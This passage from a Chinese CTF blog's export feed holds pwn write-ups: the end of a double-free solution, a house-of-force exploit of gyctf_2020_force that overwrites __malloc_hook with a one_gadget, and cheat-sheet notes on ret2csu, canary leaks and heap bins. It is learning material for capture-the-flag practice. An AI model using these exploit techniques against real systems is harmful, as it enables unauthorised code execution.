<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30s 0x6020a0-8</span><br><span class="line">0x602098:	&quot;&quot;</span><br><span class="line">0x602099:	&quot;&quot;</span><br><span class="line">0x60209a:	&quot;&quot;</span><br><span class="line">0x60209b:	&quot;&quot;</span><br><span class="line">0x60209c:	&quot;&quot;</span><br><span class="line">0x60209d:	&quot;&quot;</span><br><span class="line">0x60209e:	&quot;&quot;</span><br><span class="line">0x60209f:	&quot;&quot;</span><br><span class="line">0x6020a0:	&quot;&#96;&quot;</span><br><span class="line">0x6020a2:	&quot;&quot;</span><br><span class="line">0x6020a3:	&quot;&quot;</span><br><span class="line">0x6020a4:	&quot;&quot;</span><br><span class="line">0x6020a5:	&quot;&quot;</span><br><span class="line">0x6020a6:	&quot;&quot;</span><br><span class="line">0x6020a7:	&quot;&quot;</span><br><span class="line">0x6020a8:	&quot;a\nag&#123;winter_excited&#125;&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x50</span>,p64(fake_chunk),<span class="number">0x50</span>,p64(fake_chunk))<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'a'</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br></pre></td></tr></table></figure>
<h4 id="5-打印4"><a href="#5-打印4" class="headerlink" title="5.打印4"></a>5.打印4</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0xac bytes:</span><br><span class="line">    &quot;# Banana&#39;s ba is a\n&quot;</span><br><span class="line">    &#39;ag&#123;winter_excited&#125;\n&#39;</span><br><span class="line">    &quot;# Banana&#39;s na is a\n&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view(4)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>
<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/104756082?spm=1001.2014.3001.5501" target="_blank" rel="noopener">i春秋新春战役PWN之Some_thing_exceting</a></p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="gyctf_2020_some_thing_exceting">文件</a></p>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>double free</tag>
      </tags>
  </entry>
  <entry>
    <title>gyctf_2020_force</title>
    <url>/2021/04/27/23-47/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
<p><del>搞得我想吐，，，总是出现奇奇怪怪的问题，sendline和send为什么返回的地址不一样，，，</del></p>
<p>没想到居然是去年高校战役的题，好吧，当时还做了下这个比赛，不过没弄这道题，发现还是一个比较常规的题，house of force</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>堆体，，，只有一个功能（puts函数没有用）</p>
<p><img src="/2021/04/27/23-47/image-20210427211531288.png" alt="image-20210427211531288"></p>
<p>对于add</p>
<blockquote>
<p>分配任意大小的chunk，但是固定读入数据0x50大小，所以如果申请的大小小于0x50，就存在堆溢出</p>
</blockquote>
<p><img src="/2021/04/27/23-47/image-20210427211635840.png" alt="image-20210427211635840"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于题目是保护全开，所以不能覆盖got表</p>
<p>方法：</p>
<ol>
<li>分配超过mmap阈值的堆块 =&gt; 经过mmap分配的地址，与libc有固定偏移 =&gt; 泄露libc地址</li>
<li>正常分配堆块 =&gt; 泄露堆地址</li>
<li>覆写top chunk‘size为0xffffffffffffffff，就可以将top chunk指针抬高</li>
<li>使top chunk落在<code>__malloc_hook</code>附近，修改<code>__malloc_hook</code>和<code>__realloc_hook</code><ul>
<li><code>__malloc_hook</code> =&gt; __realloc_hook + 0x10（为了满足one_gadget的限制） </li>
<li><code>__realloc_hook</code> =&gt; one_gadget</li>
</ul>
</li>
<li>malloc一下 =&gt; getshell</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息"><a href="#0-基本信息" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><blockquote>
<p>保护全开，故考虑覆盖__malloc_hook</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file gyctf_2020_force </span><br><span class="line">gyctf_2020_force: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;6d464fea7805860b83ff9bc8f4467dd258ebd04f, stripped</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec gyctf_2020_force </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h4 id="1-分配大块"><a href="#1-分配大块" class="headerlink" title="1.分配大块"></a>1.分配大块</h4><blockquote>
<p>分配一个0x200000的超大块，启用mmap分配，与libc的偏移固定，并计算得到libc_base</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    &#39;bin addr 0x7ff0e84e4010\n&#39;</span><br><span class="line">    &#39;content\n&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e84e4000</span><br><span class="line">0x7ff0e84e4000:	0x0000000000000000	0x0000000000201002</span><br><span class="line">0x7ff0e84e4010:	0x000a7265746e6977	0x0000000000000000</span><br><span class="line">0x7ff0e84e4020:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;5s 0x7ff0e84e4010</span><br><span class="line">0x7ff0e84e4010:	&quot;winter\n&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x559a9f799000     0x559a9f79a000 r-xp     1000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x559a9f99a000     0x559a9f99b000 r--p     1000 1000   &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x559a9f99b000     0x559a9f99c000 rw-p     1000 2000   &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x7ff0e84e4000     0x7ff0e86e5000 rw-p   201000 0      </span><br><span class="line">    0x7ff0e86e5000     0x7ff0e88a5000 r-xp   1c0000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e88a5000     0x7ff0e8aa5000 ---p   200000 1c0000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aa5000     0x7ff0e8aa9000 r--p     4000 1c0000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aa9000     0x7ff0e8aab000 rw-p     2000 1c4000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aab000     0x7ff0e8aaf000 rw-p     4000 0      </span><br><span class="line">    0x7ff0e8aaf000     0x7ff0e8ad5000 r-xp    26000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cb8000     0x7ff0e8cbb000 rw-p     3000 0      </span><br><span class="line">    0x7ff0e8cd4000     0x7ff0e8cd5000 r--p     1000 25000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cd5000     0x7ff0e8cd6000 rw-p     1000 26000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cd6000     0x7ff0e8cd7000 rw-p     1000 0      </span><br><span class="line">    0x7fffae287000     0x7fffae2a8000 rw-p    21000 0      [stack]</span><br><span class="line">    0x7fffae2c0000     0x7fffae2c3000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7fffae2c3000     0x7fffae2c5000 r-xp     2000 0      [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] libc_base:0x7ff0e86e5000</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bin_addr  = add(<span class="number">0x200000</span>,<span class="string">'winter'</span>)</span><br><span class="line"><span class="comment">#0x7f52f5a7d000 - 0x7f52f587c010 = 0x200FF0</span></span><br><span class="line">libc_base = <span class="number">0x200FF0</span> + bin_addr</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<h4 id="2-正常分配"><a href="#2-正常分配" class="headerlink" title="2.正常分配"></a>2.正常分配</h4><blockquote>
<p>正常分配，得到的地址，是heap的基地址，因为申请0x18的大小，故top chunk就在heap_base+0x10</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    &#39;bin addr 0x559aa0cf3010\n&#39;</span><br><span class="line">    &#39;content\n&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x559aa0cf3000</span><br><span class="line">0x559aa0cf3000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559aa0cf3010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x559aa0cf3020:	0x0000000000000000	0xffffffffffffffff</span><br><span class="line">0x559aa0cf3030:	0x000000000000000a	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] heap_base:0x559aa0cf3010</span><br><span class="line">[+] top_chunk:0x559aa0cf3020</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heap_base = add(<span class="number">0x18</span>,payload)</span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heap_base))</span><br><span class="line">top_chunk = heap_base + <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">"top_chunk:"</span>+hex(top_chunk))</span><br></pre></td></tr></table></figure>
<h4 id="3-分配到malloc附近"><a href="#3-分配到malloc附近" class="headerlink" title="3.分配到malloc附近"></a>3.分配到malloc附近</h4><blockquote>
<p><code>__malloc_hook</code>-0x33附近有\x7f，故分配到这里</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x559aa0cf3000</span><br><span class="line">0x559aa0cf3000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559aa0cf3010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x559aa0cf3020:	0x0000000000000000	0x00002a5647db6ad1</span><br><span class="line">0x559aa0cf3030:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x559aa0cf3040:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target = malloc_hook - top_chunk - <span class="number">0x33</span></span><br><span class="line"></span><br><span class="line">add(target,<span class="string">'aaaa'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e8aa9b20 - 0x33 - 5</span><br><span class="line">0x7ff0e8aa9ae8 &lt;_IO_wide_data_0+296&gt;:	0x0000000000000000	0x00007ff0e8aa8260</span><br><span class="line">0x7ff0e8aa9af8:	0xffffd5a9b8249529	0x00007ff0e876aea0</span><br><span class="line">0x7ff0e8aa9b08 &lt;__realloc_hook&gt;:	0x00007ff0e876aa70	0x0000000000000000</span><br><span class="line">0x7ff0e8aa9b18:	0x0000000000000000	0x0000000100000000</span><br></pre></td></tr></table></figure>
<h4 id="4-覆写-malloc-hook"><a href="#4-覆写-malloc-hook" class="headerlink" title="4.覆写__malloc_hook"></a>4.覆写__malloc_hook</h4><blockquote>
<p>用gadget覆写malloc_hook，为了调节栈帧（<a href="https://bbs.pediy.com/thread-246786.htm" target="_blank" rel="noopener">参考博客</a>），还覆写realloc_hook。</p>
<ul>
<li>realloc_hook =&gt; one_gadget</li>
<li>malloc_hook =&gt; realloc_hook + 0x10</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e8aa9b0d - 5</span><br><span class="line">0x7ff0e8aa9b08 &lt;__realloc_hook&gt;:	0x00007ff0e872a27a	0x00007ff0e8769720</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">realloc_data = one_gadget[<span class="number">1</span>] + libc_base</span><br><span class="line">malloc_data = realloc + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'aaaaaaaa'</span> + p64(realloc_data) + p64(malloc_data))</span><br></pre></td></tr></table></figure>
<h4 id="5-malloc-gt-getshell"><a href="#5-malloc-gt-getshell" class="headerlink" title="5.malloc =&gt; getshell"></a>5.malloc =&gt; getshell</h4><blockquote>
<p>执行一次malloc操作，即可get shell</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"puts"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"size"</span>)</span><br><span class="line">p.sendline(str(<span class="number">24</span>))</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>分配超过mmap阈值的堆块 =&gt; 经过mmap分配的地址，与libc有固定偏移 =&gt; 泄露libc地址</li>
<li>house of force</li>
<li>realloc调节栈帧</li>
</ol>
<h3 id="参考-amp-下载"><a href="#参考-amp-下载" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h3><p>参考博客：</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_44145820/article/details/105522043" target="_blank" rel="noopener">BUUCTF-PWN gyctf_2020_force（house of force）</a></li>
<li><a href="https://www.cnblogs.com/zhwer/p/14135734.html" target="_blank" rel="noopener">gyctf_2020_force | House of force</a></li>
</ul>
<p>下载：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">文件</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><a href="gyctf_2020_force">文件</a></td>
</tr>
<tr>
<td style="text-align:center"><a href="libc-2.23.so">LIBC</a></td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>house of force</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞基础知识</title>
    <url>/2021/01/30/11-42/</url>
    <content><![CDATA[<h1 id="联系"><a href="#联系" class="headerlink" title="联系"></a>联系</h1><p><img src="/2021/01/30/11-42/68a11cc3598c41fd165693c241ab3a6f.png" alt="68a11cc3598c41fd165693c241ab3a6f"></p>
<ul>
<li>POC：漏洞验证程序</li>
<li>审计产品：网络流量监控</li>
<li>指纹库：存储设备识别脚本</li>
<li>Snort：开源入侵检测引擎</li>
<li>防火墙：网络流量监控与拦截</li>
<li>渗透测试工具：发现设备漏洞并利用漏洞进行攻击</li>
</ul>
<h2 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h2><ul>
<li>国家信息安全漏洞库（CNNVD）【CNNVD-年月-顺序号（如CNNVD-201907-1598）】</li>
<li>国家信息安全漏洞<strong>共享</strong>平台（CNVD）【CNVD-年份-顺序号（如CNVD-2019-26836）】</li>
<li>美国国家漏洞数据库（NVD）【CVE-年份-顺序号（如CVE-2019-14770）】</li>
</ul>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>POC（proof of concept 观点验证程序）是<strong>漏洞验证程序</strong>，它可能由验证过程文档及验证脚本等构成。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>关于漏洞你需要了解这些知识：<a href="https://6cloudtech.com/portal/article/index/id/170.html" target="_blank" rel="noopener">https://6cloudtech.com/portal/article/index/id/170.html</a></p>
]]></content>
      <tags>
        <tag>漏洞基础</tag>
      </tags>
  </entry>
  <entry>
    <title>常忘基础知识</title>
    <url>/2020/11/07/23-39/</url>
    <content><![CDATA[<h3 id="光标"><a href="#光标" class="headerlink" title="光标"></a>光标</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo -e &quot;\033[?25l&quot;  隐藏光标</span><br><span class="line">echo -e &quot;\033[?25h&quot; 显示光标</span><br></pre></td></tr></table></figure>
<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop	&#x2F;&#x2F;使用root</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"read"</span>,addr)					<span class="comment">#已经泄漏的函数地址</span></span><br><span class="line">libc_base = addr - obj.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr = obj.dump(<span class="string">"system"</span>) + libc_base		<span class="comment">#计算其他地址</span></span><br><span class="line">print(<span class="string">"system:"</span>+hex(system_addr))</span><br><span class="line">binsh_addr = obj.dump(<span class="string">"str_bin_sh"</span>) + libc_base</span><br><span class="line">print(<span class="string">"binsh_addr:"</span>+hex(binsh_addr))</span><br></pre></td></tr></table></figure>
<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><h1 id="因为是edi，而binsh在libc里面的地址是0x7f开头的八位，所以不能直接用"><a href="#因为是edi，而binsh在libc里面的地址是0x7f开头的八位，所以不能直接用" class="headerlink" title="因为是edi，而binsh在libc里面的地址是0x7f开头的八位，所以不能直接用"></a>因为是edi，而binsh在libc里面的地址是0x7f开头的八位，所以不能直接用</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span><span class="params">(part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span>)</span>:</span></span><br><span class="line">	payload  = p64(part1)			<span class="comment"># part1 entry pop_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">	payload += p64(<span class="number">0x0</span>)			<span class="comment"># rbx must be 0x0</span></span><br><span class="line">	payload += p64(<span class="number">0x1</span>)			<span class="comment"># rbp must be 0x1</span></span><br><span class="line">	payload += p64(jmp2)			<span class="comment"># r12 jump to</span></span><br><span class="line">	payload += p64(arg3)			<span class="comment"># r13  -&gt; rdx    arg3</span></span><br><span class="line">	payload += p64(arg2)			<span class="comment"># r14  -&gt; rsi    arg2</span></span><br><span class="line">	payload += p64(arg1)			<span class="comment"># r15d -&gt; edi    arg1</span></span><br><span class="line">	payload += p64(part2)			<span class="comment"># part2 entry will call [r12+rbx*0x8]</span></span><br><span class="line">	payload += <span class="string">'A'</span> * <span class="number">56</span>			<span class="comment"># junk 6*8+8=56</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<h3 id="64位传参"><a href="#64位传参" class="headerlink" title="64位传参"></a>64位传参</h3><p>参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p>
<h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><p><img src="/2020/11/07/23-39/u=465806655,3876495324&amp;fm=26&amp;gp=0.jpg" alt="点击查看源网页"></p>
<h3 id="查看内存命令"><a href="#查看内存命令" class="headerlink" title="查看内存命令"></a>查看内存命令</h3><p>用gdb查看内存</p>
<p>格式: x /nfu</p>
<p>说明<br> x 是 examine 的缩写</p>
<p><strong>n表示要显示的内存单元的个数</strong></p>
<p><strong>f表示显示方式, 可取如下值</strong><br> x 按十六进制格式显示变量。<br> d 按十进制格式显示变量。<br> u 按十进制格式显示无符号整型。<br> o 按八进制格式显示变量。<br> t 按二进制格式显示变量。<br> a 按十六进制格式显示变量。<br> i 指令地址格式<br> c 按字符格式显示变量。<br> f 按浮点数格式显示变量。</p>
<p><strong>u表示一个地址单元的长度</strong><br> b表示单字节，<br> h表示双字节，<br> w表示四字节，<br> g表示八字节</p>
<h3 id="修改pwngdb或者peda"><a href="#修改pwngdb或者peda" class="headerlink" title="修改pwngdb或者peda"></a>修改pwngdb或者peda</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gedit &#x2F;.gdbinit</span><br><span class="line">source &#x2F;home&#x2F;winter&#x2F;pwndbg&#x2F;gdbinit.py</span><br><span class="line">source ~&#x2F;peda&#x2F;peda.py</span><br></pre></td></tr></table></figure>
<h3 id="python函数函数"><a href="#python函数函数" class="headerlink" title="python函数函数"></a>python函数函数</h3><h5 id="数字和字符串转换"><a href="#数字和字符串转换" class="headerlink" title="数字和字符串转换"></a>数字和字符串转换</h5><p>chr(x )         将一个整数转换为一个字符   </p>
<p>ord(x )         将一个字符转换为它的整数值   </p>
<h5 id="查看变量类型"><a href="#查看变量类型" class="headerlink" title="查看变量类型"></a>查看变量类型</h5><p>type()函数</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>ascii码的字符打印出来 printf “\037”</p>
<p>用字符的ascii码执行程序：printf “\023\342” | ./可执行文件</p>
<h3 id="追踪"><a href="#追踪" class="headerlink" title="追踪"></a>追踪</h3><p>ltrace ./可执行文件</p>
<h3 id="gdb使用peda和pwngdb"><a href="#gdb使用peda和pwngdb" class="headerlink" title="gdb使用peda和pwngdb"></a>gdb使用peda和pwngdb</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gedit ~&#x2F;.gdbinit</span><br><span class="line">&#x2F;&#x2F;peda</span><br><span class="line">source ~&#x2F;peda&#x2F;peda.py</span><br><span class="line">&#x2F;&#x2F;v8 gdb</span><br><span class="line">source ~&#x2F;.gdbinit_v8</span><br><span class="line">source &#x2F;home&#x2F;winter&#x2F;v8&#x2F;v8&#x2F;tools&#x2F;gdb-v8-support.py</span><br><span class="line">&#x2F;&#x2F;pwngdb</span><br><span class="line">source &#x2F;home&#x2F;winter&#x2F;pwndbg&#x2F;gdbinit.py</span><br><span class="line">&#x2F;&#x2F;gef</span><br><span class="line">source &#x2F;home&#x2F;winter&#x2F;.gdbinit-gef.py</span><br><span class="line">&#x2F;&#x2F;Pwngdb</span><br><span class="line">source ~&#x2F;peda&#x2F;peda.py</span><br><span class="line">source ~&#x2F;Pwngdb&#x2F;pwngdb.py</span><br><span class="line">source ~&#x2F;Pwngdb&#x2F;angelheap&#x2F;gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<h3 id="linux初始化root密码"><a href="#linux初始化root密码" class="headerlink" title="linux初始化root密码"></a>linux初始化root密码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/07/23-39/image-20201015164326447.png" alt="image-20201015164326447"></p>
<h3 id="ubuntu-安装pip"><a href="#ubuntu-安装pip" class="headerlink" title="ubuntu 安装pip"></a>ubuntu 安装pip</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 更新系统包</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"><span class="comment"># 2. 安装Pip</span></span><br><span class="line">sudo apt-get install python-pip</span><br><span class="line"><span class="comment"># 3. 检查 pip 是否安装成功</span></span><br><span class="line">pip -V</span><br></pre></td></tr></table></figure>
<h3 id="生成指定数目字符串"><a href="#生成指定数目字符串" class="headerlink" title="生成指定数目字符串"></a>生成指定数目字符串</h3><p>cyclic 100</p>
<h3 id="检测机制"><a href="#检测机制" class="headerlink" title="检测机制"></a>检测机制</h3><h4 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h4><p>不能覆盖got表</p>
<p>malloc、realloc、free函数在开始时会查看对应的hook变量是否为空，不为空则调用变量中的地址，寻找malloc_hook、realloc_hook、free_hook</p>
<h4 id="泄漏cannary"><a href="#泄漏cannary" class="headerlink" title="泄漏cannary"></a>泄漏cannary</h4><blockquote>
<p>Canary设计为以字节”\x00”结尾，本意是为了保证Canary可以截断字符串。</p>
</blockquote>
<p>因为存在栈溢出，所以可以覆盖地位的’\x00’，让canary随着前面的数据一起输出。</p>
<p>内存存放情况：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>局部变量</th>
</tr>
</thead>
<tbody>
<tr>
<td>canary</td>
</tr>
<tr>
<td>ebp</td>
</tr>
<tr>
<td>返回地址</td>
</tr>
<tr>
<td>参数</td>
</tr>
</tbody>
</table>
</div>
<p>所以，有canary的栈题。</p>
<p>如果数据是[rbp - n]</p>
<ul>
<li>第一次泄漏填充的长度就是rbp - 0x8（canary）+ 1（覆盖那个‘\x00’）</li>
<li>第二次填充的长度rbp - 0x8 + canary</li>
</ul>
<h4 id="partial-write绕过pie"><a href="#partial-write绕过pie" class="headerlink" title="partial write绕过pie"></a>partial write绕过pie</h4><blockquote>
<p>partial  write就是利用了PIE技术的缺陷。我们知道，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程。</p>
</blockquote>
<p>由于地址的后3位一样，所以覆盖的话至少需要4位，那么倒数第四位就需要爆破，爆破范围在0到0xf</p>
<h3 id="各种bin"><a href="#各种bin" class="headerlink" title="各种bin"></a>各种bin</h3><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><blockquote>
<p>0x20 - 0x80</p>
<p>后进先出</p>
</blockquote>
<p>使用单链表对空闲堆块进行连接</p>
<p>只有bk</p>
<p>单向链表</p>
<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><blockquote>
<p>0x20 - 0x400(1024)</p>
<p>先进先出</p>
</blockquote>
<p>bk和fd</p>
<p>双向链表</p>
<h4 id="larage-bin"><a href="#larage-bin" class="headerlink" title="larage bin"></a>larage bin</h4><blockquote>
<p>大于0x400</p>
</blockquote>
<p>bk和fd、找到下一个和他大小不同的堆块</p>
<p>根据large bin的大小，用fd_nextsize和bk_nextsize按大小排序连接</p>
<p>利用：实现任意地址写堆地址</p>
<h4 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h4><p>双向链表</p>
<blockquote>
<p>chunk被释放后，如果大小不再fastbin内，会先放到unsortedbin中</p>
<p>在申请内存的时候，如果大小不是fastbin大小的内存，并且在smallbin中没有找到合适的chunk，就会从unsortedbin中查找。</p>
</blockquote>
<h3 id="堆里用"><a href="#堆里用" class="headerlink" title="堆里用"></a>堆里用</h3><h4 id="篡改size域"><a href="#篡改size域" class="headerlink" title="篡改size域"></a>篡改size域</h4><p>chunk extend =&gt; chunk overlap</p>
<h4 id="篡改prev-size域和prev-in-use域"><a href="#篡改prev-size域和prev-in-use域" class="headerlink" title="篡改prev_size域和prev_in_use域"></a>篡改prev_size域和prev_in_use域</h4><h5 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h5><p>attack：</p>
<p>FD = target - 12</p>
<p>BK = target - 8</p>
<p>target = target -12</p>
<h5 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h5><p>类似unlink、后向合并检查不严</p>
